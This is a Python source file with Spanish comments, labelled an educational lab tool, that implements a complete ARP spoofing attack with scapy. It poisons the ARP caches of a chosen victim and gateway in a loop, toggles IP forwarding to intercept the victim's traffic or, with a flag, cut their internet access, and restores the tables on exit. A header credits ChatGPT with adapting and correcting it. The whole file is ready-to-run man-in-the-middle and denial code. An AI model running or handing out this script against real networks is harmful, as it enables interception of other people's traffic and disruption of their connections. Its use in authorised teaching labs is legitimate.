#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Herramienta educativa para ARP Spoofing
Uso exclusivo en laboratorio controlado con fines académicos.
Autor: Juan Romero Collazos
Adaptado y corregido por ChatGPT
"""

import argparse
import os
import sys
import platform
import time
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send, srp

# --- Colores para mensajes ---
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
B = "\033[94m"
W = "\033[0m"

def enable_ip_forwarding():
    """Activa el reenvío de IP para permitir/romper el Internet."""
    system = platform.system().lower()
    if "linux" in system:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    elif "darwin" in system:  # macOS
        os.system("sysctl -w net.inet.ip.forwarding=1")
    elif "windows" in system:
        os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f")
    print(f"{G}[+] IP forwarding habilitado{W}")

def disable_ip_forwarding():
    """Desactiva el reenvío de IP para restaurar Internet."""
    system = platform.system().lower()
    if "linux" in system:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    elif "darwin" in system:  # macOS
        os.system("sysctl -w net.inet.ip.forwarding=0")
    elif "windows" in system:
        os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 0 /f")
    print(f"{Y}[-] IP forwarding deshabilitado{W}")

def get_mac(ip):
    """Obtiene la dirección MAC de una IP usando ARP request."""
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_req
    answered = srp(packet, timeout=2, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    """Envía un paquete ARP falso a la víctima."""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"{R}[-] No se pudo obtener la MAC de {target_ip}{W}")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """Restaura las tablas ARP a su estado original."""
    dest_mac = get_mac(destination_ip)
    src_mac = get_mac(source_ip)
    if dest_mac and src_mac:
        packet = ARP(op=2, pdst=destination_ip, hwdst=dest_mac,
                     psrc=source_ip, hwsrc=src_mac)
        send(packet, count=4, verbose=False)

def main():
    parser = argparse.ArgumentParser(description="Herramienta educativa de ARP Spoofing")
    parser.add_argument("-t", "--target", required=True, help="IP de la víctima")
    parser.add_argument("-g", "--gateway", required=True, help="IP del gateway")
    parser.add_argument("--no-internet", action="store_true", help="Cortar el Internet de la víctima (no reenviar paquetes)")
    args = parser.parse_args()

    target_ip = args.target
    gateway_ip = args.gateway
    enable_forward = not args.no_internet

    try:
        if enable_forward:
            enable_ip_forwarding()
        else:
            disable_ip_forwarding()

        print(f"{G}[+] Iniciando ARP spoofing... (Ctrl+C para detener){W}")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Deteniendo... restaurando red{W}")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        if enable_forward:
            disable_ip_forwarding()
        print(f"{G}[+] Limpieza completada{W}")

if __name__ == "__main__":
    if platform.system().lower() != "windows" and os.geteuid() != 0: # type: ignore[attr-defined]
        print("Este script debe ejecutarse como root.")
        sys.exit(1)
    main()
